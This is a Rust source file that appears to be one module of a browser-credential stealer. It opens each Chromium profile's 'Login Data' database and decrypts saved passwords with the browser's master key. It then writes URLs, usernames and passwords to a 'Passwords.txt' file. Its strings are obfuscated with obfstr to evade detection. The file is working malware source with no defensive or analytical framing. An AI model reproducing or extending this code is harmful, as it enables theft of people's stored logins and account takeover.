use sqlite::DatabaseReader;
use alloc::borrow::ToOwned;
use alloc::boxed::Box;
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec::Vec;
use sqlite::{read_sqlite3_database_by_bytes, TableRecord, TableRecordExtension};
use tasks::{parent_name, Task};
use utils::path::{Path, WriteToFile};
use crate::chromium::Browser;
use crate::Password;
use obfstr::obfstr as s;
use utils::browsers::chromium::decrypt_data;

const LOGINS_ORIGIN_URL: usize = 0;
const LOGINS_USERNAME_VALUE: usize = 3;
const LOGINS_PASSWORD_VALUE: usize = 5;

pub(super) struct PasswordsTask {
    browser: Arc<Browser>
}

impl PasswordsTask {
    pub(super) fn new(browser: Arc<Browser>) -> Self {
        Self { browser }
    }
}

impl Task for PasswordsTask {
    parent_name!("Passwords.txt");

    unsafe fn run(&self, parent: &Path) {
        let mut passwords: Vec<Password> = self.browser
            .profiles
            .iter()
            .filter_map(|profile| get_passwords(profile, &self.browser.master_key))
            .flat_map(|v| v.into_iter())
            .collect();

        if passwords.is_empty() {
            return;
        }

        passwords.sort();
        passwords.dedup();

        let _ = passwords
            .iter()
            .map(|password| password.to_string())
            .collect::<Vec<String>>()
            .join("\n\n")
            .write_to(parent);
    }
}

fn get_passwords(profile: &Path, master_key: &[u8]) -> Option<Vec<Password>> {
    let passwords_path = profile / s!("Login Data");
    let bytes = passwords_path.read_file().ok()?;

    let db = read_sqlite3_database_by_bytes(&bytes)?;
    let table = db.read_table(s!("Logins"))?;

    let cookies = table
        .filter_map(|record| extract_password_from_record(&record, master_key))
        .collect();

    Some(cookies)
}

fn extract_password_from_record(record: &Box<dyn TableRecord>, master_key: &[u8]) -> Option<Password> {
    let origin = record
        .get_value(LOGINS_ORIGIN_URL)
        .and_then(|value| value.as_string())
        .map(|s| s.to_owned());

    let username = record
        .get_value(LOGINS_USERNAME_VALUE)
        .and_then(|value| value.as_string())
        .map(|s| s.to_owned());

    let password = record
        .get_value(LOGINS_PASSWORD_VALUE)
        .and_then(|value| value.as_blob())
        .and_then(|blob| unsafe { decrypt_data(blob, master_key) });

    if let (None, None) = (&username, &password) {
        return None
    }

    Some(Password {
        origin,
        username,
        password
    })
}